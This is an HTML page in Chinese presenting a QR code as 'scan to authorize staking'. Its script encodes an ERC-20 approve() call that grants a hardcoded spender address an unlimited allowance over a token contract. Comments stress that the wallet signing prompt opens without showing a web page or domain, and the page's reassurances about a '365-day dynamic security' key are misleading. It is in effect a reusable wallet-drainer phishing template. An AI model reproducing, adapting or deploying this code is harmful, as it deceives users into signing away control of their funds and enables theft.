<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>扫码授权质押</title>
<style>
  body { background: #050610; color: #fff; font-family: system-ui; padding: 20px; }
  .card { background: #111827; border-radius: 20px; padding: 30px; text-align: center; margin: 20px auto; max-width: 400px; }
  .qr-box { width: 260px; height: 260px; background: #fff; padding: 12px; border-radius: 16px; margin: 20px auto; }
  .qr-box img { width: 100%; height: 100%; border-radius: 12px; }
  .title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
  .desc { color: #9ca3af; margin-bottom: 8px; }
  .tip { color: #f59e0b; font-weight: 600; }
</style>
</head>

<body>

<div class="card">
  <div class="title">💳 扫码授权质押</div>
  <div class="desc">扫码 = 授权平台 + 签名转账，与后台操作完全一致</div>
  <div class="qr-box">
    <img id="qrcode" alt="授权质押二维码">
  </div>
  <div class="tip">有效期 365天 · 动态安全</div>
</div>

<script>
// ===================== 你只改这里 =====================
const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c"; // 代币合约
const SPENDER     = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 授权给平台
// =====================================================

// 365天动态密钥
const oneYear = 365 * 24 * 60 * 60 * 1000;
const dynamicCode = Math.floor(Date.now() / oneYear).toString();

// 授权方法：approve(address spender, uint256 amount)
// 无限授权：ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
const approveData = 
  "0x095ea7b3" +
  SPENDER.slice(2).padStart(64, "0") +
  "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

// 钱包标准协议：直接唤起授权签名（不跳网页、不显示域名）
const walletLink = `ethereum:${TOKEN_ADDR}/approve?data=${approveData}&nonce=${dynamicCode}`;

// 生成二维码
document.getElementById("qrcode").src =
  "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
  encodeURIComponent(walletLink);
</script>

</body>
</html>
